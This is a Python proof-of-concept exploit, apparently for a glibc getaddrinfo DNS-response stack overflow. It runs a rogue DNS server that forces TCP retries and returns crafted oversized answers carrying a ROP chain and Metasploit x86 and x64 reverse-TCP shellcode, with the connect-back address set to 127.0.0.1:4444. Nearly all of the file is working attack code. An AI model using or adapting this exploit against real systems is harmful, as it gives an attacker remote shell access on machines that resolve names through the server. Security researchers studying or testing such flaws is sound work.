#!/usr/bin/python
#
# Copyright 2016 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors: 
#   Fermin J. Serna <fjserna@google.com>
#   Gynvael Coldwind <gynvael@google.com>
#   Thomas Garnier <thgarnie@google.com>

import socket
import time
import struct
import threading

IP = '127.0.0.1' # Insert your ip for bind() here...

buffer_overflow ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

payload_104 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad"

# linux/x64/shell_reverse_tcp - 74 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
# ReverseConnectRetries=5, ReverseListenerBindPort=0, 
# ReverseAllowProxy=false, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# InitialAutoRunScript=, AutoRunScript=
x64_shellcode =  ""
x64_shellcode += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
x64_shellcode += "\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
x64_shellcode += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
x64_shellcode += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
x64_shellcode += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
x64_shellcode += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# linux/x86/shell_reverse_tcp - 68 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
# ReverseConnectRetries=5, ReverseListenerBindPort=0, 
# ReverseAllowProxy=false, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# InitialAutoRunScript=, AutoRunScript=
x86_shellcode =  ""
x86_shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
x86_shellcode += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f"
x86_shellcode += "\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50"
x86_shellcode += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
x86_shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
x86_shellcode += "\x0b\xcd\x80"

terminate = False
last_reply = None
reply_now = threading.Event()


def dw(x):
  return struct.pack('>H', x)

def dd(x):
  return struct.pack('>I', x)

def dl(x):
  return struct.pack('<Q', x)

def db(x):
  return chr(x)

def udp_thread():
  global terminate

  # Handle UDP requests
  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind((IP, 53))

  reply_counter = 0
  counter = -1

  answers = []

  while not terminate:
    data, addr = sock_udp.recvfrom(1024)
    print '[UDP] Total Data len recv ' + str(len(data))
    id_udp = struct.unpack('>H', data[0:2])[0]
    query_udp = data[12:]

    # Send truncated flag... so it retries over TCP
    data = dw(id_udp)                    # id
    data += dw(0x8380)                   # flags with truncated set
    data += dw(1)                        # questions
    data += dw(0)                        # answers
    data += dw(0)                        # authoritative
    data += dw(0)                        # additional
    data += query_udp                    # question
    data += '\x00' * 2500                # Need a long DNS response to force malloc 

    answers.append((data, addr))

    if len(answers) != 2:
      continue

    counter += 1

    if counter % 4 == 2:
      answers = answers[::-1]

    time.sleep(0.01)
    print "[UDP] Return First Evil Packet"
    sock_udp.sendto(*answers.pop(0))
    reply_now.wait()
    print "[UDP] Return Second Evil Packet"
    #sock_udp.sendto(*answers.pop(0))

  sock_udp.close()


def tcp_thread():
  global terminate
  counter = -1

  #Open TCP socket
  sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_tcp.bind((IP, 53))
  sock_tcp.listen(10)

  while not terminate:
    conn, addr = sock_tcp.accept()
    counter += 1
    print 'Connected with ' + addr[0] + ':' + str(addr[1])

    # Read entire packet
    data = conn.recv(1024)
    print '[TCP] Total Data len recv ' + str(len(data))

    reqlen1 = socket.ntohs(struct.unpack('H', data[0:2])[0])
    print '[TCP] Request1 len recv ' + str(reqlen1)
    data1 = data[2:2+reqlen1]
    id1 = struct.unpack('>H', data1[0:2])[0]
    query1 = data[12:]

    # Do we have an extra request?
    data2 = None
    if len(data) > 2+reqlen1:
      reqlen2 = socket.ntohs(struct.unpack('H', data[2+reqlen1:2+reqlen1+2])[0])
      print '[TCP] Request2 len recv ' + str(reqlen2)
      data2 = data[2+reqlen1+2:2+reqlen1+2+reqlen2]
      id2 = struct.unpack('>H', data2[0:2])[0]
      query2 = data2[12:]

    # Reply them on different packets
    data = ''
    data += dw(id1)                      # id
    data += 'A'* (0x800-2 )

    #ANSWERS1 = ( 65535 - 6 ) / 32
    ##for i in range(ANSWERS1):
    #  answer = dd( 0 )
    #  answer += dd( 0x21 )
    #  answer += dw(0xADDE)  # name compressed
    #  answer += dw( 0 )
    #  answer += dw( 0 )
    #  answer += dw( 1 )
      

    #  data += answer

    data1_reply = dw(len(data)) + data

    magic_address = 0x08600b08
    # 0x080aa606
    magic_address =  0x06a60a08

    getaddrinfo_got_plt = 0xcca10a08 #  0x080aa1cc
    offset = 0xf0080200      # 0x208f0
    saved_eip = 0x33050608
    #  0x08060533 : xor eax, eax ; pop ebx ; pop esi ; ret 
    #   0x0804da7c : xor eax, eax ; pop ebx ; ret
    second_gadget = 0x8ce00908
    #   0x0809e08c:	xor    (%ebx),%esi
    #   0x0809e08e:	ret
    #
    third_gadget =  0xd6d70408
    #    0x0804d7d6 : pop ebx ; pop edi ; ret

    #    0x08057317:	pop    %edi
    #    0x08057318:	pop    %ebp
    #    0x08057319:	ret    
    forth_gadget = 0x49080708
    #   0x08070849 : add ebx, esi; ret 
    save_ebx = 0xaa070508
    #   0x080507aa : mov eax, ebx ; pop ebx ; ret

    get_current_esp = 0x8ee10708
    #  0x0807e18e : push esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret


    if data2:
      data = ''
      data += dw(id2)
      data += 'A' * 2046
      data += 'B' * 12
      data += dd( magic_address )  # bypass anwsp == orignin_anwsp
      data += dd( magic_address )  # bypass dns response check
      data += 'C' * 8 
      data += dd( 0 )  #  resplen2 < 12
      data += 'D' * 44
      data += dd( saved_eip )
      data += dd( getaddrinfo_got_plt )
      data += dd( 0 )
      data += dd( second_gadget )  # got getaddrinfo function's address
      data += dd( third_gadget )  
      data += dd( offset )
      data += dd( magic_address )
      data += dd( forth_gadget )  # ebx = got mprotect 's address
      #   0x080507aa : mov eax, ebx ; pop ebx ; ret
      data += dd( save_ebx )     # eax point to mprotect
      data += "junk"
      #   0x08081cb8 : neg edx ; add esp, 0x10 ; pop esi ; pop edi ; pop ebp ; ret
      data += dd( 0xb81c0808 )
      data += 'A' * 0x10
      data += 'A' * 4 * 3
      data += dd( get_current_esp )      
      data += "junk"* 3   # ebx save the current esp
      #     0x0805289f : xchg eax, ebp; ret
      data += dd( 0x9f280508 )
      #    0x08060536:	pop    %esi
      #    0x08060537:	ret  
      data += dd( 0x36050608 )
      data += dd( 0x50000000 )
      #  0x08070849 : add ebx, esi ; ret
      #  0x08056524 : add esi, ebx ; ret
      data += dd( 0x24650508 )  # esi point to stack
      #data += dd( 0x49080708 )
      #  0x080a5d69:	lea    (%esi),%ecx
      #  0x080a5d6b:	adc    $0x41,%al
      #  0x080a5d6d:	ret  
      data += dd( 0x695d0a08 )
      #   0x0806e857:	pop    %ebx
      #   0x0806e858:	ret  
      data += dd( 0x57e80608 )
      data += dd( 0x0 )
      #   0x08070849 : add ebx, esi ; ret
      data += dd( 0x49080708 )
      #   0x080507aa : mov eax, ebx; pop ebx; ret
      data += dd( 0xaa070508 )
      data += dd( 0x0 ) 
      #  0x08070849 : add ebx, esi ; ret
      data += dd( 0x49080708 )
      #   0x080731f7 : and eax, edx ; pop ebx ; ret
      data += dd( 0xf7310708 )
      data += dd( 0x0 )
      
      #  0x08070848 : mov dword ptr [ecx], eax ; ret
      data += dd( 0x48080708 )
      #     0x0805289f : xchg eax, ebp; ret
      data += dd( 0x9f280508 )
      #     0x080a0b3b:	jmp    *%eax
      data += dd( 0x3b0b0a08 )
      data += dd( 0x761f0508)
      data += dd( 0x0 )
      data += dd( 0x00100000 )
      data += dd( 0x07000000 ) 
      #   0x080a0f5b:	jmp    *%esp
      data += dd( 0x5b0f0a08 )
      data += "\x90" * 20
      data += x86_shellcode

      data2_reply = dw(len(data)) + data
    else:
      data2_reply = None

    reply_now.set()
    time.sleep(0.01) 
    conn.sendall(data1_reply)
    time.sleep(0.01)
    if data2:
      conn.sendall(data2_reply)

    reply_now.clear()

  sock_tcp.shutdown(socket.SHUT_RDWR)
  sock_tcp.close()


if __name__ == "__main__":

 t = threading.Thread(target=udp_thread)
 t.daemon = True
 t.start()
 tcp_thread()
 terminate = True

